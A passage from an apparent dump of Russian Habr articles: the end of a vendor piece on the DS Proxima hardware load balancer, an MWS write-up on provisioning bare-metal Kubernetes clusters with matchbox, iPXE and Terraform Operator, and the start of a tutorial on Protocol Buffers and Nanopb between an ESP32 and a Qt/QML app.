неисправленными месяцами;Ограниченная совместимость — нет гарантий корректной работы на вашем оборудовании, а также стабильности в будущих обновлениях;Отсутствие официальной поддержки — компании остаются один на один с проблемами.Кроме того, ни серый импорт, ни open-source решения не соответствуют требованиям регуляторов. Именно поэтому российский бизнес всё активнее рассматривает представленные на рынке отечественные решения.Что предлагает рынку DS Proxima: аппаратная балансировка уровня enterpriseПервый российский аппаратный балансировщик DS Proxima предлагает принципиально иной подход по сравнению с программными решениями, обеспечивая три ключевых преимущества:Производительность выше 1 Тбит/с — благодаря аппаратной обработке трафика на FPGA решение гарантированно поддерживает высокие нагрузки на уровне L4;Максимальная отказоустойчивость — архитектура, не зависящая от операционной системы, исключает целый класс потенциальных сбоев, характерных для программных решений;Соответствие всем необходимым регуляторным требованиям: • Включён в Единый реестр российской радиоэлектронной продукции (ПП РФ № 878); • Соответствует требованиям доверенных ПАК.Именно эти характеристики делают DS Proxima оптимальным решением для крупных коммерческих предприятий (enterprise-сегмента), а также государственных корпораций и ведомств в сфере критически важной информационной инфраструктуры (КИИ).Аппаратный балансировщик нагрузки DS ProximaDS Proxima: балансировщик, созданный на основе реального опыта внедренийРазработка DS Proxima стала закономерным этапом нашего технологического развития. Всё началось в 2022 году с решения сложной задачи по кластеризации NGFW с использованием брокеров сетевых пакетов DS Integrity. Подробнее о деталях реализации можно прочитать в наших предыдущих статьях:Балансировка трафика на межсетевые экраны с помощью брокеров сетевых пакетовОбщие проблемы, возникающие при эксплуатации межсетевых экранов Межсетевой экран (МЭ, FW) представля...habr.comСхемы использования брокера сетевых пакетов DS Integrity NG при балансировке трафика на кластер межсетевых экрановВ предыдущей статье была рассмотрена возможность использования брокера сетевых пакетов DS Integrity ...habr.comВ 2024 году совместно с BI.ZONE и «Код Безопасности» мы успешно протестировали кластер из 16 NGFW «Континент 4», достигнув суммарной пропускной способности 400 Гбит/с. Эти испытания подтвердили возможность масштабирования и обеспечения отказоустойчивости. Подробности тестирования можно посмотреть здесь.Однако главной задачей брокера сетевых пакетов остаётся оптимизация трафика. Опыт реализации балансировки нагрузки на DS Integrity показал необходимость создания специализированного балансировщика, способного гибко адаптироваться к различным сценариям распределения нагрузки. Разработка DS Proxima, начатая в конце 2022 года, объединила проверенные решения из предыдущих проектов с новыми ключевыми усовершенствованиями:Лёгкая интеграция в инфраструктуру с поддержкой стандартных протоколов L2 и L3 (OSPF, BGP);Поддержка механизма отслеживания сессий для динамической балансировки трафика с возможностью плавного ввода/вывода устройств из кластера без прерывания сервиса;Расширенный список алгоритмов балансировки, включая Least Connections, Weighted Least Connections и Least Response Time;Гибко настраиваемый функционал контроля состояния кластера на уровнях L3/L4/L7;Работа в режиме кластера высокой доступности с поддержкой стандартных протоколов L2/L3: LAG LACP, MC-LAG, VRRP.Эволюция балансировки нагрузки от брокера сетевых пакетов с специализированному устройствуDS Proxima: единая точка балансировки разных средств сетевой безопасности и серверов приложенийНа текущий момент мы сформировали парк пилотного оборудования и уже запустили тестовые проекты с заказчиками, а также испытания с ведущими российскими технологическими партнерами. В ходе этих проектов мы отмечаем значительный интерес к сценариям балансировки различных средств сетевой безопасности, включая:Межсетевые экраны веб-приложений (WAF)Прокси-серверыTLS-шлюзыСистемы контроля сетевого доступа (NAC)Sandbox-решенияВ части балансировки инфраструктурных серверов мы видим интерес к балансировке веб-серверов, почтовых серверов и средств корпоративной коммуникации.Важное конкурентное преимущество заключается в том, что высокая пропускная способность и портовая ёмкость решения позволяют использовать DS Proxima как единую точку балансировки разных систем. После первоначального внедрения в инфраструктуру к одному балансировщику можно последовательно подключать разные средства сетевой безопасности и серверы приложений. Единая точка интеграции различных систем значительно упрощает последующее масштабирование.DS Proxima — единая точка балансировки для всех сервисовВ ближайшей перспективе планируется переход от пилотных проектов к промышленной эксплуатации решения.ЗаключениеЭтот материал открывает цикл статей о возможностях аппаратного балансировщика DS Proxima. В следующих публикациях вас ждёт описание реальных кейсов из пилотных проектов с технологическими партнёрами. Также мы расскажем о том, как комбинация DS Proxima и решений наших партнёров позволяет реализовать функционал, сопоставимый с контроллерами доставки приложений (Application Delivery Controllers).Надеемся, информация будет полезной для широкого круга специалистов, сталкивающихся с необходимостью замены зарубежных балансировщиков на отечественные аналоги.Приглашаем к диалогу в комментариях или в нашем Telegram-сообществе: t.me/dsproxima, если вы: ищете оптимальное решение для балансировки нагрузкихотите поделиться своим опытомимеете вопросы по внедрениюВместе мы сможем выработать лучшие практики!"
67,Куб всему голова: строим внутреннюю Kubernetes-платформу на BareMetal в MWS,MWS,"Больше, чем облако",0,"Аппаратное обеспечение, Связь и телекоммуникации, Домены и хостинг",2025-04-09,"Всем привет! Меня зовут Иван Гулаков, последние несколько лет я занимаюсь построением и поддержкой платформы по предоставлению Kubernetes-кластеров для внутренних команд разработки в MWS. Эта статья — пересказ моего доклада с DevOps Conf 2024 о том, как мы наливаем железки и превращаем их в k8s-кластеры по всем канонам IaC.За прошлый год наши подходы к наливке изменились. Тем не менее, это был важный шаг для становления нашей внутренней платформы Piñata.Почему именно BareMetal и при чём здесь облако  Вы наверняка пользовались различными облаками. Главный строительный блок любого облака — слой IaaS, она же инфраструктура как сервис. IaaS традиционно стоит на трёх китах:— Compute;— Network;— Storage.Сервисам, которые всё это обеспечивают, нужно где-то запускаться. Если это нижний строительный блок облака, логично использовать в качестве рантайма BareMetal. BareMetal обеспечивает максимальный уровень производительности, потому что нет никаких прокладок в виде виртуализации — мы общаемся напрямую с железкой. Следующий аргумент в пользу BareMetal — требования от наших DPL*-сервисов, например compute и network. Агент виртуализации должен работать с железкой напрямую.Сервисы IaaS да и всего остального облака делятся на две большие группы:— CPL (control plane);— DPL (data plane).CPL — «мозг» системы. Он отвечает за принятие решений, управление и координацию. А DPL — «мышцы» системы, которые выполняют задачи, worker nodes. С точки зрения процесса деплоя и эксплуатации CPL — классические микросервисы. DPL — уже не такие классические и требуют отдельных подходов (privileged, host network).Если схлопнуть оба типа сервисов под единый оркестратор, у команд эксплуатации и разработки значительно упрощается жизнь. Из минусов — у BareMetal значительно сложнее capacity management в отличие от виртуалок. Железки надо правильно тюнить и грамотно расходовать ресурсы. Запустить оптимальное число сервисов на каждом сервере — довольно нетривиальная задача. И вот как мы подошли к её решению.Платформа Piñata  Для нормальной работы разработчикам облака требуется большое количество стендов. Стенды могут потребоваться и для изолированного тестирования фич, размещения отдельных команд разработки, проведения демо и кучи других вещей. Каждый стенд может состоять из нескольких Kubernetes-кластеров. Соответственно, k8s-кластеры мы развёртываем в большом количестве и часто их «перекатываем». Поэтому мы решили разработать свою внутреннюю платформу — Piñata. Это решение для деплоя Kubernetes-кластеров, а не доставку кода разработчиков (приложений) в них.В основу платформы легли принципы: Подход Kubernetes Native во главе угла. Все инфраструктурные компоненты платформы мы реализовывали в формате операторов.GitOps- и IaC-подходы для поставки конфигурации в операторы.Management-кластер Kubernetes как центральная точка имплементации изменений (привет, Cluster API).Платформу условно можно разделить на три части:  Из чего состоит Piñata  GitOps-контроллер отвечает за поставку конфигурации непосредственно в управляющий кластер. Он используется и в дочерних кубах — доставка CNI, наших агентов мониторинга и т. д.Управляющий кластер существует в единственном экземпляре на окружение, он управляет всеми «дочками».Дочерний кластер — k8s-кластер, где разработчики запускают приложения.Слой BareMetal — набор приложений, которые подготавливают сервер, наливают на него операционную систему и осуществляют day 0 provisioning для того, чтобы железка в дальнейшем стала частью k8s-кластера.Terraform Operator непосредственно запускает деплой Kubernetes.Пройдёмся по этому списку поподробнее.GitOps  Мы используем контроллер Fleet от Rancher и раскатываем кластеры в виде инфраструктурных релизов. Любой релиз состоит из двух основных частей: CR Terraform и конфигурационного секрета, в котором лежат токены и прочие чувствительные данные, необходимые для работы оператора и раскатки дочернего кластера.  Флоу GitOps  Мы используем GitOps- и IaC-подходы в любом конфигурационном репозитории кластера. Содержимое репозитория, естественно, в формате yaml. Релиз упакован с помощью helm и доставляется через Fleet.  Прячем секреты  Логичный вопрос — а как спрятать в конфигурационном репозитории секреты, упомянутые выше? Тут всё просто — релиз поставляется в виде двух СR: Terraform и VaultStaticSecret. Vault secrets operator с помощью этой СR вытягивает из Vault данные и создаёт итоговый k8s Secret. В самой CR Terraform мы делаем референс на итоговый секрет, так как знаем имя, под которым он будет синхронизирован из хранилища.  BareMetal  Заливка операционки на хост  Операционка заливается на хост в четыре этапа:Включение железки и настройка её Boot Order. Стандартный процесс PXE-загрузки. В нашем случае iPXE, потому что PXE устарел.После появления NBP-загрузчика из п. 2 мы получаем конфиги для пост-провижининга операционной системы. Это может быть Ignition и CloudInit.Profit!Разберём подробнее.За первый пункт отвечает Piñata BareMetal Operator, наша внутренняя разработка. Это приложение умеет включать и выключать железный хост, собирать статус с его IPMI и выставлять корректный порядок загрузки хоста.Это связующая часть между хостом и matchbox. Оператор ходит в него по gRPC и переключает там активные конфиги для хоста. Это часть конфигурации Piñatametal.PXE и iPXE А теперь вспомним, как работает PXE и iPXE. Всё начинается со стандартной загрузки хоста, у которого в boot order первый пункт — PXE Boot. Сетевая карточка посылает специальный запрос DHCP Discover и получает ответ.В ответе присутствует специальный параметр BootFileName. Он указывает на адрес TFTP-сервера, на котором можно найти загрузчик. Далее firmware сетевой карточки выдёргивает специальный загрузчик NBP — Network Boot Protocol. После его скачивания загружается скрипт Boot iPXE. В нём есть меню, похожее на bash-скрипт, в котором указано, какое ядро linux и initrd откуда загрузить, чтобы начать наливать операционную систему.За конфигурацию наливки отвечает уже matchbox — open-source-продукт, которым может воспользоваться любой желающий. Изначально он был заточен под установку или загрузку системы семейства CoreOS — Flatcar. Это простой веб-сервер, который умеет отдавать файлики по REST API и gRPC API.Matchbox  Как мы дорабатывали matchbox  У matchbox есть три основных сущности:Machine group — нечто похожее на идентификатор хоста, который позволяет при загрузке отличить машину от других. Это неочевидно, но группа для однозначной идентификации чаще всего состоит из одной машины. В качестве селектора выступает mac-адрес.Profile описывает, как правильно налить ОС на конкретную машину. Чаще всего это ссылки на нужное ядро, initrd и аргументы запуска для ядра (/proc/cmdline), которые позволят операционной системе загрузиться в инсталлятор.Ignition (butane) или cloud-init. В том же облаке есть метадата-сервер, который предоставляет система виртуализации. А вот у железки что-то должно быть посредником для подготовки ignition- и cloud-init-конфигураций. Matchbox позволяет наливать BareMetal как виртуальную машину.А ещё мы доработали matchbox, добавив четвёртую сущность — iPXE-menu для работы с iPXE Boot скриптами, упомянутыми выше. В базовом matсhbox захардкожено только одно меню. Мы расширили возможности работы с конфигурацией в формате cloud-init для того, чтобы начать наливать не только Flatcar, но и Ubuntu.Сам по себе matchbox — это обычное веб-приложение, не заточенное под запуск в Kubernetes. Изначально мы просто обернули его в helm chart, а вся его конфигурация доставлялась в ходе рендеринга этого чарта в виде стандартных кубовых configmap’ов.На дистанции такой подход стал плохо масштабироваться. Чарт очень сильно распухал и при выкатке тащил за собой очень много configmap’ов, которые монтировались в pod в виде отдельных mount’ов. Мы решили это переработать и написали вспомогательный сервис config loader — sidecar с k8s-клиентом внутри, который ходит в API Куба, вычитывает определённые configmap’ы (фильтрация по служебным labels + annotations) и складывает их содержимое на ФС пода в виде файлов. Проблема с десятками mount’ов была решена.Ещё одна доработка кодовой части matchbox — клиент для Netbox. Изначально мы жили строго на статических адресах, но это плохо масштабируется. Когда два инженера одновременно наливают серверы и по ошибке выставляют в наливочных конфигах два одинаковых адреса — это боль. Поэтому мы реализовали «псевдостатику» — инженеры больше не вписывают IP-адреса в конфиги самостоятельно, matchbox делает это сам с помощью шаблонизации, обогащённой данными из Netbox. C точки зрения Linux итоговая адресация остаётся статической, не DHCP или SLAAC. Как выглядят наливочные конфиги  Рассмотрим сокращённый конфиг, на котором видно, как мы описываем машины. Всё содержимое дальнейших скриншотов — это фактически values для helm-чарта matchbox, лежащие в конфигурационном репозитории.Обратите внимание, что содержимое секции groups не соответствует тому, что попадает в итоговые configmap’ы с содержимым сущностей groups от самого matchbox. Это наша абстракция. Внутри содержится куча всего разного:— mac-адреса для идентификации хоста;— hostname;— настройки для генерации CR для Piñata BareMetal Operator (для подключения к IPMI хоста) и другое.Чувствительная информация не протекает в итоговую конфигурацию, есть только референсы для Vault Secret Operator.Вторая часть — аналогичная обёртка с небольшим количеством метаинформации, только для сущности Profile. На её основе генерится итоговая ссылка до kernel + initrd от Flatcar, лежащих на нашем Nexus.  Последний кусочек — butane-шаблоны (Ignition). Внутри чартов есть несколько базовых butane-шаблонов, а секция override позволяет перезаписывать из values-чарта отдельные их части, чтобы не приходилось каждый раз добавлять новые файлики и пересобирать сам helm chart.  Как всё это работает  Теперь давайте разберёмся, как работают в связке matchbox и Piñatametal Operator.  Matchbox ubuntu installation  Диаграмму можно разбить на два блока:— Первичная установка Ubuntu на хост (до пункта now we get ubuntu installed on HDD).— Перезагрузка хоста и донастройка ОС через cloud-init.Теперь посмотрим на iPXE-menu поближе. Тут есть две важных строчки, отрендеренных matchbox, — kernel и initrD. В строке kernel есть не только ссылка до файла ядра, но и аргументы для последующей загрузки ОС (/proc/cmdline).После выполнения скрипта меню (можно выбрать нужный пункт самостоятельно, в нашем случае он называется ipxe) загружается специальный инсталлятор ОС, инструкции для которого описаны в файле autoinstall.yaml.Это специальный конфигурационный формат для установщика Ubuntu casper, он похож по синтаксису на стандартный cloud-init.После прогона всех этапов инсталлятора мы получаем установленную на диск или диски ОС. Теперь нам надо не попасть в бесконечный цикл переустановки ОС. Для этого Piñatametal Operator идёт в API matchbox и «перещёлкивает» профиль у машинки. Он мутирует строчку profile в сущности group нужной машины.И тут есть интересный момент. Главный постулат GitOps — что в репозитории, то и на стенде. Из-за обилия  dummy-коммитов GitOps плохо подходит для промежуточных состояний, например для переключения сущности profile. Поэтому мы вынесли эту логику в matchbox. В GitOps-репозитории у нас описано только желаемое состояние хоста, а не промежуточное.Ещё нюанс — в обоих случаях, до и после замены итогового iPXE-меню, первым пунктом в bootOrder хоста остаётся PXE. Тем не менее, даже если хост вдруг потеряет сетевую связность, вторым пунктом всегда остаётся загрузка с диска, так что сервер не превратится в тыкву.Финальный штрих — загрузившийся хост опять идёт в matchbox, получает сloud-init и донастраивается. К установке k8s готовы.Что мы используем: Flatcar и Ubuntu  Наверняка по тексту выше вы заметили, что где-то идут референсы на конфиги Flatcar, а где-то — на Ubuntu. Мы действительно используем две ОС с разной методологией.Flatcar — это легковесная ОС, оптимизированная для запуска контейнеров. Поставляется в виде готовых образов (squashFS/qcow/vmdk), включающих все необходимые компоненты container runtime, что позволяет быстро развернуть Kubernetes. Бонусом — immutable, хоть и с некоторыми нюансами.Мы полностью загружаем Flatcar в ramdisk. На физических дисках присутствуют только два раздела: /opt/rke и /var/lib/docker. Это нужно, чтобы после перезагрузки нода не забыла, что является частью Kubernetes-кластера, и для кеширования docker-образов в качестве бонуса.Ubuntu устанавливается как обычно, никаких ramdisk, все данные строго персистентные. Ubuntu используется для стендов сервисов Compute/Storage и прочих дистрибутиво-зависимых сервисов, Flatcar — для быстрого поднятия разработческих песочниц в dev.TF-Operator  Для работы с самим Terraform мы используем open source проект Terraform Operator. Он позволяет запускать стандартный пайплайн Terraform Init/Plan/Apply в виде отдельных Job’ов в k8s. Логи прогона наливок всех кластеров находятся в одном mgmt-кластере, их удобно смотреть.  Давайте посмотрим на пример конфигурации и пройдёмся по важным моментам.В качестве бэкенда для Terraform state используем k8s по нескольким причинам:— остальные стейты тоже в k8s в виде CR;— для каждого кластера у нас организован бэкап etcd, поэтому всё легко восстановить, если что-то пойдёт не так.Сам оператор предоставляет ряд полезных фичей.Фишки TF-Operator  Require approval позволяет затормозить пайплайн деплоя Terraform на этапе plan. Для инженера это выглядит так: pod с Terraform plan внутри пишет лог в stdout, а специальный trap-скрипт внутри ожидает создания файла по определённому пути. Если инженера устраивает список производимых изменений, он проваливается в pod, создаёт этот файл, далее запускается pod с Terraform apply.С одной стороны, выглядит неудобно, с другой — это позволяет защитить свою инфраструктуру от случайного уничтожения из-за ошибки конфигурации.Ещё одно отличие от классического Terraform — возможность кастомизации его пайплайна деплоя. Специальные pre- и post-хуки позволяют выполнять различные скрипты между этапами init/plan/apply. Кроме того, можно сделать выполнение хука опциональным. В случае если он не отработает, пайплайн работы Terraform не упадёт в ошибку.Все этапы пайплайна от стандартного Terraform до хуков Terraform operator можно обогащать данными с помощью переменных окружения и монтирования configmap’ов внутрь самих pod’ов.Итоговый процесс наливки кластера  Полный флоу деплоя  Соберём всё вместе и посмотрим, как выглядит процесс появления нового k8s-кластера на BareMetal.Появляется таска в Jira.Подготавливается конфигурация наливки ОС для нового кластера (matchbox). В дальнейшем она отправится в GitOps-репозиторий mgmt-кластера.Подготавливается конфигурация наливки самого k8s и сервисов, которые будут установлены в него. Она отправится в отдельный репозиторий для дочернего кластера. У каждого кластера есть такой репозиторий.Конфиги пушатся в git, в mgmt-кластере отрабатывает Fleet и устанавливает helm-релиз нового кластера.Начинается процесс наливки ОС на серверы.После окончания установки ОС запускается Terraform c RKE внутри.Финальный штрих — внутрь дочернего кластера попадает собственный экземпляр Fleet и дотягивает внутрь различные системные компоненты, например CSI-драйвер.Такой процесс наливки кластера на железки занимает обычно меньше часа без учёта времени подготовки конфигураций.Что в итоге: плюсы и минусы подхода  В шапке статьи я уже упоминал, что наши подходы к наливке кубов сильно изменились. Появился долгожданный ClusterAPI, был написан infra provider для него и ещё целая пачка вспомогательных операторов. Выводы ниже — это некий срез на начало 2024 года, ровно перед началом новой большой стройки. Что было хорошо тогда и сохранилось сейчас:Относительно легковесная и простая наливка железок.Подход Kubernetes Native — всё, что можно, упаковываем в CR, обрабатываем их операторами.Конфигурация в репозитории в YAML — наглядно и удобно читать.Единая точка управления всем зоопарком кластеров — mgmt k8s, а не с ноутбука инженера.А что не очень:Много разнородных open source компонентов в системе. Если что-то вдруг ломалось посреди пути, то дебажить было то ещё удовольствие.Terraform. Он довольно-таки хорошо решал свои задачи, как промежуточное решение, но хотелось большего (метрики, более гранулярное логирование, ретраи).Наследственные болячки самого RKE1.Читайте и смотрите другие материалы про строительство нового облака MWSЗачем мы строим собственное публичное облако? Рассказывает CTO MWS Данила ДюгуровРеалити-проект для инженеров про разработку облака — Building the Cloud.Рассказываем про архитектуру сервисов платформы ещё до релиза.Подкаст ""Расскажите про MWS""Карьера в MWS"
68,Эффективная передача данных: используем Protocol Buffers для коммуникации между ESP32 и QT/QML,OTUS,Цифровые навыки от ведущих экспертов,0,"Консалтинг и поддержка, Рекрутинг и HR, Производство мультимедиа-контента",2025-04-09,"В этой статье я хочу рассказать вам о том, как можно эффективно использовать Protocol Buffers в сочетании с ESP32 и Qt Framework. Для наглядности я сделаю это на примере собственного хобби‑проекта, который представляет из себя гидропонную систему. В этом проекте мы попытаемся наладить коммуникацию между ESP32 и приложением Qt/QML, используя Protocol Buffers через UDP.ESP32 выступает в роли встроенной системы гидропонной установки, а Qt/QML отвечает за мониторинг данных и управление. Но прежде чем мы приступим к реализации, давайте разберемся, что такое Protocol Buffers.Что такое Protobuf?Protocol Buffers, или Protobuf — это уникальный протокол сериализации данных, разработанный компанией Google. В отличие от традиционных текстовых форматов, таких как XML или JSON, Protobuf использует двоичный код для передачи данных, что обеспечивает высокую скорость за (счет легкости данных). Одна из ключевых особенностей Protobuf заключается в том, что он, подобно языку программирования, имеет свой собственный синтаксис и компилятор. Это позволяет легко передавать данные между различными платформами и делает его независимым от языков программирования. Protobuf поддерживает множество языков, включая C++, Java, Python, GO и многие другие. Мы можем использовать Protobuf в любом приложении, где нам требуется собственный метод коммуникации или структура пакетов. Однако наиболее часто он применяется в gRPC в качестве языка описания интерфейса. Сообщения Protobuf хранятся в файле с расширением .proto (например, person.proto) и описываются следующим образом:syntax = ""proto3""  message Person {   optional string name = 1;   optional int32 id = 2;   optional string email = 3; }Как мы уже упоминали выше, у Protobuf есть свой собственный компилятор, который позволяет нам создавать сообщения protobuf для любого языка, как показано ниже.protoc --cpp_out=. person.protoВ результате сборки генерируются библиотечные файлы. Для приведенного выше proto‑файла они будут называться person_pb.cc и person_pb.h.В этом примере я хочу изменить структуру сообщений, чтобы они стали более реалистичными, а также добавить вложенные сообщения. Proto‑файл под названием hydroponic_data.proto, который я буду использовать в этом примере, выглядит следующим образом:syntax = ""proto3"";  package hydroponic;  enum MessageType {     MSG_HEART_BEAT = 0;     MSG_OK = 1;     MSG_ERROR = 2;     MSG_DATA = 3;     MSG_TIMEOUT = 4;  MSG_CMD = 5; }  enum CMD {  CMD_VALVE_ON = 0;  CMD_VALVE_OFF = 1;  CMD_PUMP_ON = 2;  CMD_PUMP_OFF = 3;  CMD_LED_ON = 4;  CMD_LED_OFF = 5; }  message Hydroponic {  MessageType messageType = 1;   oneof msg {   DataPackage dataPackage = 2;   HeartBeat heartBeat = 3;   MessageOk messageOk = 4;   MessageError messageError = 5;   MessageTimeout messageTimeout = 6;   Command cmd = 7;  }  }  message DataPackage {     uint32 deviceID = 2;     string sector = 3;     float eConductivity = 4;     float ph = 5;     float moisture = 6;     float temperature = 7;     uint32 waterLevel = 8;     bool valveState = 9;     bool pumpState = 10;     bool ledStatus = 11; }  message HeartBeat {  uint32 elapsedTime = 1; }  message MessageOk {  string responseMessage = 1; }  message MessageError {  string errorType = 1; }  message MessageTimeout {  string timeoutMessage = 1; }  message Command {  CMD command = 1; }Еще один важный аспект, о котором стоит упомянуть, — это вложенные сообщения. Как вы могли заметить, выше было описано несколько сообщений, которые находились внутри других. В языке Protobuf такое расположение одного сообщения внутри другого называется вложенным. Ключевое слово oneof позволяет нам ограничить количество вложенных сообщений в одном сообщении. То есть, мы можем отправлять только одно из вложенных сообщений за раз.Что такое Nanopb?Для работы с Protocol Buffers на ESP32 мы будем использовать библиотеку Nanopb. Nanopb — это легковесная и эффективная библиотека на языке C для кодирования и декодирования Protobuf‑сообщений. Nanopb, разработанная компанией Espressif Systems, оптимизирована специально для микроконтроллеров. У нее есть собственный protobuf‑компилятор под названием protoc, который также генерирует библиотеки на языке C после сборки. Для использования вложенных сообщений с Nanopb нам нужно добавить следующие строки в наш proto‑файл.import 'nanopb.proto'; ... option (nanopb_msgopt).submsg_callback = true;После этого proto‑файл будет выглядеть следующим образом:syntax = ""proto3"";  import 'nanopb.proto';  package hydroponic;  enum MessageType {     MSG_HEART_BEAT = 0;     MSG_OK = 1;     MSG_ERROR = 2;     MSG_DATA = 3;     MSG_TIMEOUT = 4;     MSG_CMD = 5; }  enum CMD {  CMD_VALVE_ON = 0;  CMD_VALVE_OFF = 1;  CMD_PUMP_ON = 2;  CMD_PUMP_OFF = 3;  CMD_LED_ON = 4;  CMD_LED_OFF = 5; }  message Hydroponic {  MessageType messageType = 1;   option (nanopb_msgopt).submsg_callback = true;   oneof msg {   DataPackage dataPackage = 2;   HeartBeat heartBeat = 3;   MessageOk messageOk = 4;   MessageError messageError = 5;   MessageTimeout messageTimeout = 6;   Command cmd = 7;  }  }  message DataPackage {     uint32 deviceID = 2;     string sector = 3;     float eConductivity = 4;     float ph = 5;     float moisture = 6;     float temperature = 7;     uint32 waterLevel = 8;     bool valveState = 9;     bool pumpState = 10;     bool ledStatus = 11; }  message HeartBeat {  uint32 elapsedTime = 1; }  message MessageOk {  string responseMessage = 1; }  message MessageError {  string errorType = 1; }  message MessageTimeout {  string timeoutMessage = 1; }  message Command {  CMD command = 1; }Чтобы скомпилировать proto‑файл в соответствии с требованиями Nanopb, нам нужно использовать protoc, который находится в каталоге, откуда мы загрузили Nanopb.pathto\generator-bin\protoc.exe --nanopb_out=. hydroponic_data.protoКроме того, для использования Protocol Buffers с ESP32, нам нужно добавить в проект библиотеки Nanopb, которые находятся в каталоге, куда мы скачали Nanopb.Также нам необходимо реализовать коллбеки для кодирования и декодирования строк и вложенных сообщений на стороне Nanopb. Я реализовал эти функции в файлах protobuf_callbacks.h и protobuf_callbacks.c.bool write_string(pb_ostream_t *stream, const pb_field_iter_t *field, void * const *arg) {     if (!pb_encode_tag_for_field(stream, field))         return false;      return pb_encode_string(stream, (uint8_t*)*arg, strlen((char*)*arg)); }  bool read_string(pb_istream_t *stream, const pb_field_t *field, void **arg) {     uint8_t buffer[128] = {0};          /* Мы можем читать блок за блоком, чтобы избежать большого размера буфера... */     if (stream->bytes_left > sizeof(buffer) - 1)         return false;     if (!pb_read(stream, buffer, stream->bytes_left))         return false;     /* Выводим строку в формате, сравнимом с protoc --decode.      * Формат берется из arg, определенного в main().      */     //printf((char*)*arg, buffer);      strcpy((char*)*arg, (char*)buffer);     return true; }  bool msg_callback(pb_istream_t *stream, const pb_field_t *field, void **arg) {      // hydroponic_Hydroponic *topmsg = field->message;     // ESP_LOGI(TAG,""Message Type: %d"" , (int)topmsg->messageType);      if (field->tag == hydroponic_Hydroponic_dataPackage_tag)     {         hydroponic_DataPackage *message = field->pData;          message->sector.funcs.decode =& read_string;         message->sector.arg = malloc(10*sizeof(char));      }      else if (field->tag == hydroponic_Hydroponic_messageOk_tag)     {         hydroponic_MessageOk *message = field->pData;          message->responseMessage.funcs.decode =& read_string;         message->responseMessage.arg = malloc(50*sizeof(char));             }      else if (field->tag == hydroponic_Hydroponic_messageError_tag)     {         hydroponic_MessageError *message = field->pData;          message->errorType.funcs.decode =& read_string;         message->errorType.arg = malloc(50*sizeof(char));      }      else if (field->tag == hydroponic_Hydroponic_messageTimeout_tag)     {         hydroponic_MessageTimeout *message = field->pData;          message->timeoutMessage.funcs.decode =& read_string;         message->timeoutMessage.arg = malloc(50*sizeof(char));            }      return true; }После этого мы готовы использовать Protocol Buffers с ESP32.... hydroponic_Hydroponic messageToSend = hydroponic_Hydroponic_init_zero;  messageToSend.messageType = hydroponic_MessageType_MSG_DATA;  messageToSend.which_msg = hydroponic_Hydroponic_dataPackage_tag;  // Решаем, какое сообщение будет отправлено.   messageToSend.msg.dataPackage.deviceID = 10;  messageToSend.msg.dataPackage.sector.arg = ""Sector-1"";  messageToSend.msg.dataPackage.sector.funcs.encode =& write_string; messageToSend.msg.dataPackage.temperature = 10.0f; ...Таким образом мы можем создавать сообщения. После создания сообщения и назначения данных определенным полям, мы можем сериализовать сообщение с помощью функции кодирования следующим образом:uint8_t buffer[128] = {0}; ... pb_ostream_t ostream = pb_ostream_from_buffer(buffer, sizeof(buffer));  pb_encode(&ostream, hydroponic_Hydroponic_fields, &messageToSend); ...Затем мы можем отправить buffer, представляющий сериализованное сообщение, используя любой предпочитаемый нами протокол связи:sendto(socket, buffer, ostream.bytes_written, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));Если кто‑то отправит protobuf‑сообщение на ESP32, мы получим его в виде массивов байтов. Для десериализации сообщения мы можем воспользоваться коллбеком декодирования:hydroponic_Hydroponic receivedMessage = hydroponic_Hydroponic_init_zero; ... pb_istream_t istream = pb_istream_from_buffer(buffer, len); receivedMessage.cb_msg.funcs.decode = &msg_callback;   bool ret = pb_decode(&istream, hydroponic_Hydroponic_fields, receivedMessage); ... if(receivedMessage.which_msg == hydroponic_Hydroponic_dataPackage_tag){          ESP_LOGI(TAG, ""Data Package Received."");       ESP_LOGI(TAG, ""Device ID: %ld"", receivedMessage.msg.dataPackage.deviceID);     ... } else if(receivedMessage.which_msg == hydroponic_Hydroponic_heartBeat_tag){     ESP_LOGI(TAG, ""Heartbeat Package Received."");     ESP_LOGI(TAG, ""Elapsed time %ld."", receivedMessage.msg.heartBeat.elapsedTime); } ... ...Поддержка на стороне QTЧтобы использовать Protocol Buffers в нашем Qt‑проекте, нам необходимо сначала скомпилировать их под C++. Вы можете ознакомиться с документацией по сборке Protocol Buffers для C++ на странице проекта Protobuf на GitHub. Qt также добавила поддержку Protocol Buffers с версии 6.6.1. В этой версии появилась возможность создавать классы protobuf на основе Qt, но я пока не пробовал этот метод. Вместо этого я покажу вам, как добавить статическую библиотеку protobuf в ваш Qt‑проект.GitHub - protocolbuffers/protobuf: Protocol Buffers — формат обмена данными от GoogleДля начала нам необходимо добавить в наш Qt‑проект статическую библиотеку (lib‑файл) и заголовочные файлы, которые были созданы при сборке из исходного кода. Чтобы сделать это, добавьте следующие строки в .pro‑файл Qt‑проекта:LIBS += -L$$PWD/protobuf/ -llibprotobufd  INCLUDEPATH += $$PWD/protobuf INCLUDEPATH += $$PWD/protobuf/include DEPENDPATH += $$PWD/protobufТакже необходимо добавить следующую строку для активации режима отладки библиотеки во время выполнения:QMAKE_CXXFLAGS_DEBUG += /MTdТеперь мы готовы создать файл hydroponic_data.proto для C++. В этом proto‑файле я удалил строки, касающиеся Nanopb, поскольку мы будем использовать собранный нами компилятор protobuf, скачанный с Github. Если этого не сделать, то компилятор будет выдавать ошибки на строках, связанных с Nanopb.pathto\protobuf\install\bin\protoc.exe --cpp_out=. hydroponic_data.protoПосле того как сгенерированная нами библиотека protobuf‑сообщений будет добавлена, мы сможем использовать Protocol Buffers в нашем Qt‑проекте.#ifndef PROTOBUFMANAGER_H #define PROTOBUFMANAGER_H  #include <QObject> #include <QMap> #include ""hydroponic_data.pb.h"" #include ""udphandler.h""  using namespace hydroponic;  class ProtobufManager : public QObject {     Q_OBJECT public:     explicit ProtobufManager(QObject *parent = nullptr);     ~ProtobufManager();      enum HydroponicMessageType{         DATA = 0,         HEART_BEAT,         MESSAGE_OK,         MESSAGE_ERROR,         MESSAGE_TIMEOUT     };     Q_ENUM(HydroponicMessageType)      enum HydroponicCMD{         CMD_VALVE_ON = 0,         CMD_VALVE_OFF = 1,         CMD_PUMP_ON = 2,         CMD_PUMP_OFF = 3,         CMD_LED_ON = 4,         CMD_LED_OFF = 5,     };      Q_ENUM(HydroponicCMD)      Q_INVOKABLE ProtobufManager::HydroponicMessageType getMessageType();     Q_INVOKABLE int getDeviceId();     Q_INVOKABLE QString getSectorName();     Q_INVOKABLE float getECval();     Q_INVOKABLE float getPh();     Q_INVOKABLE float getMoisture(); // изменим тип 